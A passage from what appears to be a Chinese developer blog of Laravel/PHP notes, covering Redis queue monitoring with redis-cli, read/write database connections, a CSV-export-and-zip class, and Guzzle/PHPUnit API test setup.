class="line">&#125;</span><br><span class="line">cat config/database.php</span><br><span class="line"></span><br><span class="line"><span class="string">'options'</span> =&gt; [</span><br><span class="line">            <span class="string">'replication'</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">'connections'</span> =&gt;[</span><br><span class="line">                <span class="string">'tcp'</span> =&gt; <span class="string">'\App\Services\RedisLog'</span>,</span><br><span class="line">            ],</span><br><span class="line">        ],</span><br></pre></td></tr></table></figure>
<h3 id="监控redis对应队列消息"><a href="#监控redis对应队列消息" class="headerlink" title="监控redis对应队列消息"></a>监控redis对应队列消息</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//laravel-china.org/articles/4479/analysis-of-laravel-queue-usage</span></span><br><span class="line">tail -f | redis-cli -h <span class="number">10.94</span><span class="number">.120</span><span class="number">.13</span> -p <span class="number">6380</span> monitor | grep <span class="string">"queues:snail"</span></span><br><span class="line"></span><br><span class="line"><span class="number">1492446053.406282</span> [<span class="number">0</span> <span class="number">10.95</span><span class="number">.117</span><span class="number">.155</span>:<span class="number">57132</span>] <span class="string">"WATCH"</span> <span class="string">"queues:snail:SendMessage:delayed"</span></span><br><span class="line"><span class="number">1492446053.406452</span> [<span class="number">0</span> <span class="number">10.95</span><span class="number">.117</span><span class="number">.155</span>:<span class="number">57132</span>] <span class="string">"ZRANGEBYSCORE"</span> <span class="string">"queues:snail:SendMessage:delayed"</span> <span class="string">"-inf"</span> <span class="string">"1492446053"</span></span><br><span class="line"><span class="number">1492446053.406754</span> [<span class="number">0</span> <span class="number">10.95</span><span class="number">.117</span><span class="number">.155</span>:<span class="number">57132</span>] <span class="string">"WATCH"</span> <span class="string">"queues:snail:SendMessage:reserved"</span></span><br><span class="line"><span class="number">1492446053.406842</span> [<span class="number">0</span> <span class="number">10.95</span><span class="number">.117</span><span class="number">.155</span>:<span class="number">57132</span>] <span class="string">"ZRANGEBYSCORE"</span> <span class="string">"queues:snail:SendMessage:reserved"</span> <span class="string">"-inf"</span> <span class="string">"1492446053"</span></span><br><span class="line"><span class="number">1492446053.407029</span> [<span class="number">0</span> <span class="number">10.95</span><span class="number">.117</span><span class="number">.155</span>:<span class="number">57132</span>] <span class="string">"LPOP"</span> <span class="string">"queues:snail:SendMessage"</span></span><br><span class="line"><span class="number">1492446053.407700</span> [<span class="number">0</span> <span class="number">10.95</span><span class="number">.117</span><span class="number">.155</span>:<span class="number">57132</span>] <span class="string">"ZADD"</span> <span class="string">"queues:snail:SendMessage:reserved"</span> <span class="string">"1492446113"</span> <span class="string">"&#123;job&#125;"</span></span><br><span class="line"><span class="number">1492446053.463953</span> [<span class="number">0</span> <span class="number">10.95</span><span class="number">.117</span><span class="number">.155</span>:<span class="number">57132</span>] <span class="string">"ZREM"</span> <span class="string">"queues:snail:SendMessage:reserved"</span> <span class="string">"&#123;job&#125;"</span></span><br><span class="line"></span><br><span class="line">laravel这边的延迟队列使用了三个队列。</span><br><span class="line"></span><br><span class="line">queue:<span class="keyword">default</span>:delayed <span class="comment">// 存储延迟任务</span></span><br><span class="line">queue:<span class="keyword">default</span> <span class="comment">// 存储“生”任务，就是未处理任务</span></span><br><span class="line">queue:<span class="keyword">default</span>:reserved <span class="comment">// 存储待处理任务</span></span><br><span class="line">任务在三个队列中进行轮转，最后一定进入到queue:<span class="keyword">default</span>:reserved，并且成功后把任务从这个队列中删除。</span><br><span class="line"></span><br><span class="line">laravel5<span class="number">.1</span> 使用了watch来控制队列的原子操作，但由于codis本身不支持 watch 方法。所以使用codis不能完全体验队列功能：延迟队列不支持、不支持数据重跑，对线上数据比较严格操作谨慎使用。</span><br><span class="line"></span><br><span class="line">laravel5<span class="number">.3</span> 之后redis队列 开始使用lua脚本支持的队列原子操作，它没有使用 watch multi等操作，所以如果线上codis 支持lua的话，可以完整体验到队列功能。</span><br></pre></td></tr></table></figure>
<h3 id="使用写库读数据"><a href="#使用写库读数据" class="headerlink" title="使用写库读数据"></a>使用写库读数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$user = DB::selectFromWriteConnection(<span class="string">'select * from users where id=42111'</span>);</span><br><span class="line">User::onWriteConnection()-&gt;find($id);</span><br><span class="line">cat config/database.php</span><br><span class="line">  <span class="string">'sticky'</span>    =&gt; <span class="literal">true</span>, <span class="comment">// laravel 5.5 新增</span></span><br><span class="line">$sql = <span class="string">'select * from a'</span>;</span><br><span class="line">DB::select($sql, [], <span class="literal">false</span>);</span><br><span class="line">#在 config/database.php 配置文件里面配置读库</span><br><span class="line"><span class="string">'write'</span> =&gt; [</span><br><span class="line">            <span class="string">'driver'</span>    =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">            <span class="string">'host'</span>      =&gt; env(<span class="string">'DB_WRITE_HOST'</span>, <span class="string">'localhost'</span>),</span><br><span class="line">            <span class="string">'database'</span>  =&gt; env(<span class="string">'DB_DATABASE'</span>, <span class="string">'forge'</span>),</span><br><span class="line">            <span class="string">'username'</span>  =&gt; env(<span class="string">'DB_USERNAME'</span>, <span class="string">'forge'</span>),</span><br><span class="line">            <span class="string">'password'</span>  =&gt; env(<span class="string">'DB_PASSWORD'</span>, <span class="string">''</span>),</span><br><span class="line">            <span class="string">'charset'</span>   =&gt; <span class="string">'utf8'</span>,</span><br><span class="line">            <span class="string">'collation'</span> =&gt; <span class="string">'utf8_unicode_ci'</span>,</span><br><span class="line">            <span class="string">'prefix'</span>    =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'strict'</span>    =&gt; <span class="literal">false</span>,</span><br><span class="line">        ],</span><br><span class="line">#手动链接主库查询</span><br><span class="line">DB::connection(<span class="string">'write'</span>)-&gt;table(<span class="string">'a'</span>)-&gt;get();</span><br><span class="line">$pdo = DB::connection()-&gt;getPdo();</span><br><span class="line">$data=DB::connection()-&gt;setPdo($pdo)-&gt;table(<span class="string">'a'</span>)-&gt;get();</span><br></pre></td></tr></table></figure>
<h3 id="Excel-导出"><a href="#Excel-导出" class="headerlink" title="Excel 导出"></a>Excel 导出</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExcelExport</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment">//字段对应的标题https://github.com/xcjiu/php-excel</span></span><br><span class="line">	private $title = [];</span><br><span class="line">	<span class="comment">//文件名</span></span><br><span class="line">	private $filename = <span class="string">''</span>;</span><br><span class="line">	<span class="comment">//字段值过滤器</span></span><br><span class="line">	private $filter = []; </span><br><span class="line">	<span class="comment">//存储文件的临时目录</span></span><br><span class="line">	private $stodir = <span class="string">'../tmp/'</span>;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 生成 excel 数据表文件</span></span><br><span class="line"><span class="comment">	 * @param  array  $data 要导出的数据</span></span><br><span class="line"><span class="comment">	 * @return bool</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">excel</span>(<span class="params">$data=[], $i=<span class="number">1</span></span>) </span></span><br><span class="line"><span class="function">	</span>&#123;  </span><br><span class="line">		set_time_limit(<span class="number">0</span>);</span><br><span class="line">	    header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</span><br><span class="line"> 		<span class="keyword">if</span>($data &amp;&amp; is_array($data))&#123;</span><br><span class="line"> 			$filename = $<span class="keyword">this</span>-&gt;filename ? $<span class="keyword">this</span>-&gt;filename : date(<span class="string">'Y_m_d'</span>);</span><br><span class="line">			$filter = $<span class="keyword">this</span>-&gt;filter;</span><br><span class="line">			$current = current($data);</span><br><span class="line">			<span class="keyword">if</span>(is_array($current))&#123;</span><br><span class="line">				$filePath = $<span class="keyword">this</span>-&gt;stodir . $filename . <span class="string">"($i)"</span> . <span class="string">'.csv'</span>;</span><br><span class="line">				$fp = fopen($filePath, <span class="string">'a'</span>);</span><br><span class="line">				fputcsv($fp, $<span class="keyword">this</span>-&gt;titleColumn(array_keys($current)));</span><br><span class="line">				foreach ($data <span class="keyword">as</span> &amp;$row) &#123;</span><br><span class="line">					foreach ($row <span class="keyword">as</span> $k =&gt; &amp;$v) &#123;</span><br><span class="line">						<span class="keyword">if</span>(isset($filter[$k]))&#123;</span><br><span class="line">							<span class="keyword">if</span>($filter[$k]==<span class="string">'datetime'</span>)&#123;</span><br><span class="line">								$v = date(<span class="string">"Y-m-d H:i:s"</span>,$v);</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">if</span>($filter[$k]==<span class="string">'date'</span>)&#123;</span><br><span class="line">								$v = date(<span class="string">"Y-m-d"</span>,$v);</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">if</span>(is_array($filter[$k]))&#123;</span><br><span class="line">								$v = isset($filter[$k][$v]) ? $filter[$k][$v] : $v;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					fputcsv($fp, $row);</span><br><span class="line">				&#125;</span><br><span class="line">				fclose($fp);</span><br><span class="line">				unset($data);</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 打包好zip文件并导出</span></span><br><span class="line"><span class="comment">	 * @param  [type] $filename [description]</span></span><br><span class="line"><span class="comment">	 * @return [type]           [description]</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">fileload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$zipname = <span class="string">"../"</span> . $<span class="keyword">this</span>-&gt;filename. <span class="string">'.zip'</span>;</span><br><span class="line">		$zipObj = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">		<span class="keyword">if</span>($zipObj-&gt;open($zipname, <span class="attr">ZipArchive</span>::CREATE) === <span class="literal">true</span>)&#123;</span><br><span class="line">			$res = <span class="literal">false</span>;</span><br><span class="line">			foreach(glob($<span class="keyword">this</span>-&gt;stodir . <span class="string">"*"</span>) <span class="keyword">as</span> $file)&#123; </span><br><span class="line">	            $res = $zipObj-&gt;addFile($file);</span><br><span class="line">	        &#125;</span><br><span class="line">			$zipObj-&gt;close();</span><br><span class="line">			<span class="keyword">if</span>($res)&#123;</span><br><span class="line">				header (<span class="string">"Cache-Control: max-age=0"</span>);</span><br><span class="line">				header(<span class="string">"Content-Description: File Transfer"</span>);</span><br><span class="line">				header(<span class="string">"Content-Disposition: attachment;filename ="</span> . $zipname);</span><br><span class="line">				header(<span class="string">'Content-Type: application/zip'</span>);</span><br><span class="line">				header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">				header (<span class="string">'Content-Length: '</span> . filesize($zipname));</span><br><span class="line">				@readfile($zipname);<span class="comment">//输出文件;</span></span><br><span class="line">				<span class="comment">//清理临时目录和文件</span></span><br><span class="line">				$<span class="keyword">this</span>-&gt;deldir($<span class="keyword">this</span>-&gt;stodir); </span><br><span class="line">				@unlink($zipname);</span><br><span class="line">				ob_flush();</span><br><span class="line">				flush();</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$<span class="keyword">this</span>-&gt;deldir($<span class="keyword">this</span>-&gt;stodir); </span><br><span class="line">				ob_flush();</span><br><span class="line">				flush();</span><br><span class="line">				die(<span class="string">'暂无文件可下载！'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$<span class="keyword">this</span>-&gt;deldir($<span class="keyword">this</span>-&gt;stodir); </span><br><span class="line">			ob_flush();</span><br><span class="line">			flush();</span><br><span class="line">			die(<span class="string">'文件压缩失败！'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 清理目录，删除指定目录下所有内容及自身文件夹</span></span><br><span class="line"><span class="comment">	 * @param  [type] $dir [description]</span></span><br><span class="line"><span class="comment">	 * @return [type]       [description]</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	private <span class="function"><span class="keyword">function</span> <span class="title">deldir</span>(<span class="params">$dir</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	    <span class="keyword">if</span>(is_dir($dir))&#123;</span><br><span class="line">	        foreach(glob($dir . <span class="string">'*'</span>) <span class="keyword">as</span> $file)&#123; </span><br><span class="line">	            <span class="keyword">if</span>(is_dir($file)) &#123; </span><br><span class="line">	                deldir($file); </span><br><span class="line">	                @rmdir($file);</span><br><span class="line">	            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	                @unlink($file);</span><br><span class="line">	            &#125; </span><br><span class="line">	        &#125;</span><br><span class="line">	       @rmdir($dir); </span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 设置标题</span></span><br><span class="line"><span class="comment">	 * @param array $title 标题参数为字段名对应标题名称的键值对数组</span></span><br><span class="line"><span class="comment">	 * @return obj this </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">title</span>(<span class="params">$title</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>($title &amp;&amp; is_array($title))&#123;</span><br><span class="line">			$<span class="keyword">this</span>-&gt;title = $title;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 设置导出的文件名</span></span><br><span class="line"><span class="comment">	 * @param string $filename 文件名</span></span><br><span class="line"><span class="comment">	 * @return obj this </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">filename</span>(<span class="params">$filename</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$<span class="keyword">this</span>-&gt;filename = date(<span class="string">'Y_m_d'</span>) . (string)$filename;</span><br><span class="line">		<span class="keyword">if</span>(!is_dir(<span class="string">"../"</span> . $<span class="keyword">this</span>-&gt;filename))&#123;</span><br><span class="line">			mkdir(<span class="string">"../"</span> . $<span class="keyword">this</span>-&gt;filename);</span><br><span class="line">		&#125;</span><br><span class="line">		$<span class="keyword">this</span>-&gt;stodir = <span class="string">"../"</span> . $<span class="keyword">this</span>-&gt;filename . <span class="string">"/"</span>;</span><br><span class="line">		<span class="keyword">return</span> $<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 设置字段过滤器</span></span><br><span class="line"><span class="comment">	 * @param array $filter 文件名</span></span><br><span class="line"><span class="comment">	 * @return obj this </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$filter</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$<span class="keyword">this</span>-&gt;filter = (array)$filter;</span><br><span class="line">		<span class="keyword">return</span> $<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 确保标题字段名和数据字段名一致,并且排序也一致</span></span><br><span class="line"><span class="comment">	 * @param  array $keys  要显示的字段名数组</span></span><br><span class="line"><span class="comment">	 * @return array 包含所有要显示的字段名的标题数组</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	protected <span class="function"><span class="keyword">function</span> <span class="title">titleColumn</span>(<span class="params">$keys</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$title = $<span class="keyword">this</span>-&gt;title;</span><br><span class="line">		<span class="keyword">if</span>($title &amp;&amp; is_array($title))&#123;</span><br><span class="line">			$titleData = [];</span><br><span class="line">			foreach ($keys <span class="keyword">as</span> $v) &#123;</span><br><span class="line">				$titleData[$v] = isset($title[$v]) ? $title[$v] : $v;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> $titleData;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $keys;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$limit = <span class="number">10000</span>; <span class="comment">//一次查询一万条记录</span></span><br><span class="line"></span><br><span class="line">$filename = <span class="string">'login_log'</span>;</span><br><span class="line"></span><br><span class="line">$title = [<span class="string">'id'</span>=&gt;<span class="string">'ID'</span>,<span class="string">'user_id'</span>=&gt;<span class="string">'用户id'</span>,<span class="string">'plat'</span>=&gt;<span class="string">'渠道'</span>,<span class="string">'username'</span>=&gt;<span class="string">'用户名'</span>,<span class="string">'sex'</span>=&gt;<span class="string">'性别'</span>,<span class="string">'ip'</span>=&gt;<span class="string">'用户ip'</span>,<span class="string">'register_time'</span>=&gt;<span class="string">'注册时间'</span>];</span><br><span class="line"></span><br><span class="line">$filter = [<span class="string">'register_time'</span>=&gt;<span class="string">'datetime'</span>];</span><br><span class="line"></span><br><span class="line">$con = mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'pass'</span>,<span class="string">'dbname'</span>) or die(<span class="string">'数据库连接不上'</span>);</span><br><span class="line"></span><br><span class="line">$countSql = <span class="string">"select count(*) from user"</span>;</span><br><span class="line"></span><br><span class="line">$count = mysqli_fetch_assoc(mysqli_query($con,$countSql));</span><br><span class="line"></span><br><span class="line">$total = $count[<span class="string">'count(*)'</span>];</span><br><span class="line"></span><br><span class="line">$excelObj = (<span class="keyword">new</span> ExcelExport())-&gt;filename($filename)-&gt;title($title)-&gt;filter($filter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; ceil($total/$limit); $i++) &#123; <span class="comment">//分段查询, 一次$limit=10000条</span></span><br><span class="line">	$offset = $i * $limit;</span><br><span class="line">	$dataSql = <span class="string">"select * from user limit $limit offset $offset"</span>;</span><br><span class="line">	$result = mysqli_query($con, $dataSql);</span><br><span class="line">	$data = [];</span><br><span class="line">	<span class="keyword">while</span> ($row = mysqli_fetch_assoc($result)) &#123;</span><br><span class="line">		$data[] = $row;</span><br><span class="line">	&#125;</span><br><span class="line">	$res = $excelObj-&gt;excel($data, $i+<span class="number">1</span>); <span class="comment">//生成多个文件时的文件名后面会标注'（$i+1）'</span></span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line">$excelObj-&gt;fileload();</span><br></pre></td></tr></table></figure>
<h3 id="使用Guzzle进行API测试"><a href="#使用Guzzle进行API测试" class="headerlink" title="使用Guzzle进行API测试"></a>使用Guzzle进行API测试</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://www.jianshu.com/p/3de203392ec4</span></span><br><span class="line">php composer.phar <span class="built_in">require</span> guzzlehttp/guzzle:~<span class="number">6.0</span></span><br><span class="line">composer global <span class="built_in">require</span> <span class="string">"phpunit/phpunit=5.5.*"</span></span><br><span class="line"></span><br><span class="line">新建一个单元测试</span><br><span class="line">php artisan make:test ReplyTest --unit</span><br><span class="line">单独执行某个测试</span><br><span class="line"> phpunit tests/Unit/ReplyTest.php</span><br><span class="line"> #cat tests/TestCase.php</span><br><span class="line"> &lt;?php</span><br><span class="line"> </span><br><span class="line"> namespace Tests;</span><br><span class="line"> </span><br><span class="line"> use Illuminate\Foundation\Testing\TestCase <span class="keyword">as</span> BaseTestCase;</span><br><span class="line"> </span><br><span class="line"> abstract <span class="class"><span class="keyword">class</span> <span class="title">TestCase</span> <span class="keyword">extends</span> <span class="title">BaseTestCase</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     use CreatesApplication;</span><br><span class="line"> &#125;</span><br><span class="line">cat tests/Unit/ReplyTest.php</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Tests\Unit;</span><br><span class="line">use Tests\TestCase;</span><br><span class="line">use Illuminate\Foundation\Testing\RefreshDatabase;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReplyTest</span> <span class="keyword">extends</span> <span class="title">TestCase</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//https://www.jianshu.com/p/3de203392ec4</span></span><br><span class="line">    protected $client;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">setUp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;client = <span class="keyword">new</span> \GuzzleHttp\Client( [</span><br><span class="line">            <span class="string">'base_uri'</span> =&gt; <span class="string">'http://httpbin.org'</span>,</span><br><span class="line">            'http_errors' =&gt; false, #设置成 false 来禁用HTTP协议抛出的异常(如 4xx 和 5xx 响应)，默认情况下HTPP协议出错时会抛出异常。</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">testAction1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = $<span class="keyword">this</span>-&gt;client-&gt;get(<span class="string">'/ip'</span>);</span><br><span class="line">        $body = $response-&gt;getBody();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//添加测试</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertEquals(<span class="number">200</span>, $response-&gt;getStatusCode());</span><br><span class="line">        $data = json_decode($body, <span class="literal">true</span>);dump($data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertArrayHasKey(<span class="string">'origin'</span>, $data);</span><br><span class="line">        <span class="comment">//$this-&gt;assertArrayHasKey('errormsg', $data);</span></span><br><span class="line">        <span class="comment">//$this-&gt;assertArrayHasKey('data', $data);</span></span><br><span class="line">        <span class="comment">//$this-&gt;assertEquals(0, $data['origin']);</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertInternalType(<span class="string">'string'</span>, $data[<span class="string">'origin'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span 